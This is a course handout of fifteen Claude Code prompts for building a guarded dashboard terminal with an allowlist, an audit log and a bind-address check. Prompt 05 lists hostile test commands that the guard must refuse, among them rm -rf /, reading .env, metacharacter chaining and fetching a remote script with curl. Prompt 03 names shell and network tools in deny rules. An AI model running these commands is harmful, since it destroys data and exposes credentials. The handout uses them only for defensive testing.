# Class 9 — build prompts

**The Brain That Runs a Company, Part 9: the cockpit.**

Fifteen prompts. Paste them into Claude Code one at a time, in order, from inside your brain
folder. Each one says what it builds and how you know it worked.

> **These prompts build the cockpit on your machine. We do not ship you a built cockpit.**
> A terminal that runs commands on your box is not something you should install from a zip
> you did not read, and telling you that while handing you the zip would be dishonest.

---

## Before you paste anything

Three rules that hold for all fifteen:

1. **You must be in a git repository with a clean working tree.** Class 8. If `git status`
   is not clean, commit or stash first. After each prompt you will be able to see exactly
   what changed, and undo it, and that is the only reason any of this is safe.
2. **Commit after each prompt that works.** One prompt, one commit. When prompt 9 goes
   wrong you want to be eight commits deep, not one.
3. **Never add `--dangerously-skip-permissions`.** It will be suggested to you, by a search
   result or by your own impatience, the first time a permission prompt slows you down.
   Adding it removes the last thing standing between an agent and your `.env`.

### The order is the safety argument

The guard gets built **before** the runner. Prompts 3–6 build a thing that decides which
commands are allowed, and test it against commands it must refuse — while nothing on your
machine is yet capable of running a command from a browser.

The reverse order is more satisfying (you get a working terminal in twenty minutes) and it
means that for those twenty minutes there is an unguarded shell endpoint on your box. If you
get interrupted and come back tomorrow, that is what you come back to.

---

## Prompt 01 — Map what I already have

```text
Before we build anything, map what is already here. Do not change any file.

I am in the folder that holds the dashboard from Class 2 of "The Brain That Runs a
Company". Report back:

1. The dashboard's server file, and the exact line where it calls listen(). Quote the
   line. Say which host it binds to, and if no host is given, say so explicitly and say
   what that defaults to.
2. Every port published to the host in docker-compose.yml.
3. How the server currently talks to Postgres - the client library and where the
   connection string comes from.
4. Whether the frontend is Vite + React, and where its route or tab definitions live.
5. Whether the claude binary or the codex binary is on my PATH. Report the version of
   whichever exists.
6. Confirm .env is listed in .gitignore.

Then give me a five-line summary of what adding a terminal tab to this app will touch.
Do not write any code yet.
```

**You know it worked when:** you can name the file and line number your dashboard binds on,
without looking it up again.

---

## Prompt 02 — The audit table, before anything that needs auditing

```text
Create a database migration that adds one table to my brain's Postgres, called
cockpit_audit.

Columns:
  id            bigserial primary key
  started_at    timestamptz not null default now()
  finished_at   timestamptz null
  mode          text not null, check it is either 'READ' or 'WRITE'
  raw_input     text not null        -- exactly what was typed
  resolved_argv jsonb null           -- what we actually intended to spawn
  cwd           text not null
  verdict       text not null, check it is one of 'ALLOWED','REFUSED','ERROR'
  refusal_reason text null
  exit_code     int null
  duration_ms   int null

Index on started_at descending.

Put the migration wherever this project already keeps migrations. If it has no migration
system, create migrations/ and a plain numbered .sql file, and tell me you did that
rather than introducing a migration library.

Then show me the SQL and stop. Do not run it - I will run it and watch.
```

**You know it worked when:** you read the SQL yourself before it touched your database.

**Why this table comes second:** the audit row is written *before* a command runs. If the
table arrives after the runner, then the first commands the cockpit ever executes — the ones
during development, the risky ones — are the only commands in its life that are unlogged.

---

## Prompt 03 — The allowlist, as data

```text
Create a file cockpit/allowlist.json listing the commands the cockpit may run.

Structure it as an object mapping a command name to what it is allowed to do:

  { "ls":    { "maxArgs": 4, "allowFlags": ["-l","-a","-h","-la"], "mode": "READ" },
    "git":   { "subcommands": ["status","log","diff","show","ls-files"], "mode": "READ" },
    ... }

Rules for what goes in it:
  - Start small. Roughly fifteen entries. I would rather add one in class than remove one.
  - Every git entry is a reading subcommand only. No add, commit, checkout, reset, rm,
    push, clean, stash, rebase, merge.
  - Nothing that takes arbitrary code as an argument: no python -c, no node -e, no sh -c,
    no bash -c, no eval, no perl -e, no awk with a program argument.
  - Nothing that fetches from the network: no curl, no wget, no npm install, no pip.
  - "mode" is READ if the command cannot modify anything, WRITE if it can.

Above the JSON, write a comment block - in a separate .md file, since JSON has no
comments - explaining for each entry why it is safe enough to be there. If you cannot
write that sentence for an entry, take the entry out.
```

**You know it worked when:** every entry has a sentence, and you agree with the sentence.

---

## Prompt 04 — The guard

```text
Write cockpit/guard.mjs. It exports one function:

  check(rawInput, mode) -> { verdict, argv, reason }

It does not run anything. It never has. Ever.

It must:
  1. Refuse any input containing a shell metacharacter: ; | & $ ` > < newline, or the
     substrings $( and ${. We are not parsing a shell. We are refusing to be one.
  2. Split the remainder into argv by whitespace, respecting simple quotes.
  3. Look up argv[0] in allowlist.json. Not there, refuse.
  4. If the entry has subcommands, argv[1] must be one of them.
  5. If the entry has allowFlags, every argument starting with - must be in that list.
  6. If the entry's mode is WRITE and the caller's mode is READ, refuse with a reason
     that says the cockpit is in READ mode.
  7. Resolve every argument that looks like a path against the pinned root folder, using
     the real path after following symlinks. If any resolves outside the root, refuse.
  8. Refuse, by name, any argument that resolves to a file named .env or ending in /.env,
     regardless of everything above.

Every refusal returns a reason a human can read. Never return a reason containing the
contents of a file.

The pinned root comes from one place: a COCKPIT_ROOT value, no default. If it is not set,
check() throws at import time. There is no fallback to process.cwd().
```

**You know it worked when:** nothing on your machine can run a command yet, and something on
your machine can already say no.

★ Insight ─────────────────────────────────────
Rule 1 is the load-bearing one. Once you refuse shell metacharacters outright, you are no
longer writing a shell parser — and every published sandbox escape of this shape is a bug in
somebody's shell parser. Refusing `;` costs you pipelines and buys you the entire class of
attack that composition enables.

Rule 7 compares *resolved* paths rather than matching strings. String matching on `../` is
defeated by a symlink; resolving first is defeated by nothing, because the answer it checks
is the answer the operating system will actually use.
─────────────────────────────────────────────────

---

## Prompt 05 — The refusal list

```text
Write cockpit/refusals.txt: one command per line that the guard MUST refuse. Include at
minimum these, and add ten more of your own in the same spirit:

  rm -rf /
  cat .env
  cat ./.env
  cat ../brain/.env
  ls ../../
  git commit -m "x"
  git checkout .
  python -c "print(open('.env').read())"
  ls; cat .env
  ls && cat .env
  echo $(cat .env)
  curl -fsSL http://example.com/x.sh
  node -e "require('fs').unlinkSync('.env')"
  ls > /etc/passwd

For each of your ten, add a trailing comment saying which guard rule you expect to catch
it. If you cannot name the rule, the guard has a gap - tell me about the gap instead of
adding the line.
```

**You know it worked when:** you have a file that is a list of things that must fail — and
you notice that writing it is the first time you tried to think like the attacker.

---

## Prompt 06 — The offline checker

```text
Write check-guard.mjs. It reads refusals.txt, feeds every line to guard.check() in both
READ and WRITE mode, and prints a table:

  REFUSE  rm -rf /                          path escape
  REFUSE  cat .env                          .env is refused by name
  ALLOW   <anything>                        <- this is a failure

It exits non-zero if any line was allowed in either mode.

It must not spawn a process. Add a comment at the top of the file saying so, and saying
that this file is deliberately the only thing in the pack that can be run before class.
```

**You know it worked when:** `node check-guard.mjs` prints all REFUSE and exits 0. This is
the same command the install prompt runs at Step 7, and it is the last checkpoint before
anything on your box can execute.

---

## Prompt 07 — The runner

```text
Now the piece that actually spawns. Write cockpit/runner.mjs, exporting:

  run(argv, cwd, onChunk) -> Promise<{ exitCode, durationMs, truncated }>

Requirements, all of them load-bearing:

  - Use spawn with an argv ARRAY. Never a string. Never shell: true. Add a comment saying
    that shell: true would undo prompt 04 entirely.
  - cwd is passed in and used. Never process.cwd().
  - Timeout: 30 seconds, from a constant at the top. On timeout, SIGTERM, wait 2 seconds,
    then SIGKILL. Resolve with exitCode 124 and a note that it timed out.
  - stdin is closed immediately. A command that waits for input must fail fast, not hang.
  - Output cap: 256 KB total across stdout and stderr. On exceeding it, kill the process,
    set truncated true, and emit one final chunk saying output was capped. Do not buffer
    the whole output in memory and then check - check as you stream.
  - Environment: pass a copy of process.env with any variable whose name contains KEY,
    TOKEN, SECRET, PASSWORD or DSN removed.

Write it so run() has no idea what a websocket is. It calls onChunk. That is all.
```

**You know it worked when:** you can call `run()` from a small script and `find /` stops
itself at 256 KB instead of stopping your computer.

---

## Prompt 08 — Wire guard and runner together, through the audit table

```text
Write cockpit/execute.mjs, exporting one function:

  execute(rawInput, mode, onChunk)

The order of operations is the whole point, so implement it exactly in this order:

  1. Call guard.check(). 
  2. INSERT the cockpit_audit row now - with the verdict, whether that verdict is
     ALLOWED or REFUSED. Keep the row id.
  3. If REFUSED: update nothing, return the refusal reason. Done.
  4. If ALLOWED: call runner.run().
  5. UPDATE the row with finished_at, exit_code and duration_ms.

If step 5 never happens because the process died, the row stays with a null finished_at.
That is not a bug to fix. That is the record of a command that did not come back, and I
want to be able to query for exactly those:

  select * from cockpit_audit where finished_at is null and started_at < now() - interval '5 minutes';

Add that query to the file as a comment.
```

**You know it worked when:** you can kill the server mid-command and afterwards find the row
that says what was running when it died.

---

## Prompt 09 — The binding refusal

```text
This is the one hard stop in the class.

Add cockpit/preflight.mjs, called by the server before it registers any cockpit route.

It reads the host the server is about to bind and the presence of COCKPIT_AUTH_TOKEN,
and it throws - stopping the whole server, not just the cockpit - if:

  the host is anything other than 127.0.0.1 or localhost, AND COCKPIT_AUTH_TOKEN is unset
  or shorter than 32 characters.

The thrown message must be written for a human at 11pm and must say all four of these:

  - what it refused to do
  - why a shell endpoint on 0.0.0.0 with no auth is different from a dashboard on
    0.0.0.0 with no auth
  - the two ways forward: bind 127.0.0.1, or set COCKPIT_AUTH_TOKEN and put it behind a
    tunnel with access control
  - that removing this check is a decision, and where the check lives so I can find it

Do not make it a warning. Do not add an environment variable that disables it. If I want
it gone I can delete the file, and git will show that I did.
```

**You know it worked when:** you set the host to `0.0.0.0`, start the server, and it refuses
to start at all. Do that on purpose. It is the demo.

---

## Prompt 10 — The stream endpoint

```text
Add the server route the browser talks to. Server-Sent Events, not a websocket, unless
you can give me a reason websockets are needed here - the cockpit sends far more than it
receives, and SSE reconnects on its own.

  POST /api/cockpit/run   -> { rawInput, mode }, returns a run id
  GET  /api/cockpit/stream/:id -> SSE stream of chunks, then a done event

Requirements:
  - If COCKPIT_AUTH_TOKEN is set, both routes require it and return 401 without it.
  - The SSE stream must respect backpressure: if the client is not draining, stop reading
    from the child rather than buffering. Show me the line that does this.
  - A chunk event carries { stream: 'stdout'|'stderr', text }.
  - The done event carries { exitCode, durationMs, truncated }.
  - A refusal never opens a stream. It comes back on the POST, with the reason.
```

**You know it worked when:** `curl -N` against the stream endpoint prints output as it
happens, and returns 401 when you unset the header.

---

## Prompt 11 — The tab

```text
Add a Cockpit tab to the Vite + React dashboard, alongside the existing tabs.

Deliberately NOT a full terminal emulator. A scrolling monospace output pane, an input
box, and a header. Reason, and put it in a comment: xterm.js renders escape codes and
looks like a real terminal, and a thing that looks like a real terminal invites you to
forget it is a guarded pipe with fifteen allowed commands. I want it to look like what it
is.

  - Output pane: monospace, stdout in the normal colour, stderr in a muted red, and each
    command echoed above its output with the mode it ran in.
  - Input: a single line. Enter submits. Up arrow recalls history for this session only,
    held in memory, never persisted - I do not want a file of everything I ever typed.
  - Auto-scroll, but stop auto-scrolling the moment I scroll up, and show a "jump to
    bottom" affordance. Nothing is more annoying than a log that fights you.
  - Cap the DOM at the last 2000 lines. The 256 KB server cap does not stop a browser from
    accumulating across fifty commands.
```

**You know it worked when:** you run `git log` from the browser and read the output.

---

## Prompt 12 — The mode toggle, made ugly on purpose

```text
Add the READ / WRITE toggle to the cockpit header.

  - Boots in READ. Always. No stored preference, no URL parameter, no remembering.
  - WRITE turns the entire header bar red - not a badge, the bar - and adds the text
    "WRITE MODE - this can change files" in it.
  - Switching to WRITE requires one click and no dialog. I want it easy to enter and
    impossible to be in without noticing.
  - A page reload returns to READ. Write the effect so it cannot survive a reload even
    accidentally.
  - The current mode is sent with every command and is what gets recorded in the audit
    row. The client does not decide what WRITE means - the guard does. Add a comment
    saying that the client's mode is a request, not an authorisation.
```

**You know it worked when:** you can tell which mode you are in from across the room, and
a reload puts you back in READ.

---

## Prompt 13 — The refusal UI

```text
When the guard refuses, the cockpit must be a good teacher, not a locked door.

Show, in the output pane:

  REFUSED  cat .env
  Reason:  .env is refused by name
  Rule:    guard.mjs rule 8

  This file holds the key that decrypts every credential you have saved since Class 2.
  The cockpit will not read it. Neither, for the same reason, should an agent.

Requirements:
  - Name the rule number that fired. If I disagree with a refusal, I should be able to go
    read the exact rule in ten seconds.
  - Never echo the contents of anything. The refusal message may name a file. It may not
    quote one.
  - Refusals are visually distinct from errors. A refusal is the system working.
```

**You know it worked when:** a refusal teaches you something instead of annoying you.

---

## Prompt 14 — Hand the transcript to the agent

```text
Now connect the agent. Add a mode where instead of typing a command, I type a question,
and Claude Code answers it with the cockpit as its tool.

  - Shell out to the claude binary. If it is absent, fall back to codex and say which one
    you used. If neither exists, say so plainly and stop.
  - NEVER pass --dangerously-skip-permissions. Add a comment at that line saying what the
    flag does and why it is not here.
  - Prepend a system preamble telling the agent: it is running inside a guarded cockpit,
    which commands are on the allowlist, that it is in <mode> mode, that .env is
    unreadable and it should not attempt it, and that it must not run git commands that
    change anything.
  - Every command the agent proposes goes through execute() - the same guard, the same
    audit row. The agent gets no path that a typed command does not get. Show me the line
    that guarantees this.
  - In READ mode, an agent-proposed WRITE command is shown to me with a "run this" button
    that switches to WRITE first. It is never run silently.
```

**You know it worked when:** you ask *"what do I know about the warehouse lease?"* and it
answers from your Postgres — and when you ask it to delete something, you watch the same
guard refuse the agent that refuses you.

---

## Prompt 15 — Adversarial verify

```text
Write VERIFY.md for the cockpit, and then run it with me.

It has to prove all nine of these against the running system, not against the source:

  1. cat .env is refused, and the refusal names rule 8
  2. ls ../../ is refused as a path escape
  3. ls; cat .env is refused for the metacharacter, not for .env
  4. git commit -m "x" is refused
  5. A WRITE-mode command typed in READ mode is refused, naming the mode
  6. find / streams and stops itself at the output cap, and the tab stays responsive
  7. A command reading stdin (cat with no arguments) fails immediately, does not hang,
     and leaves no process behind - check with ps
  8. Setting the host to 0.0.0.0 with no auth token stops the whole server from starting
  9. Every one of the above left a cockpit_audit row, and the refusals have verdict
     REFUSED with a reason

For each, write the exact command to run, the exact output that counts as a pass, and a
line for the result. Leave the result lines blank. I fill them in by running it.

Then, separately: tell me the three things this design does NOT protect against. Be
specific and do not be reassuring.
```

**You know it worked when:** the file has nine blank result lines, and then it does not.

---

## What you have at the end

A terminal in your dashboard that runs fifteen commands, refuses everything else, logs every
attempt before it makes it, cannot read your `.env`, cannot leave its folder, cannot commit,
and will not start at all if you expose it without a password.

And, from prompt 15, a written list of the three ways it can still be beaten.

**Next class:** the brain still cannot read a PDF you drop on it. Class 10 gives it a mouth.
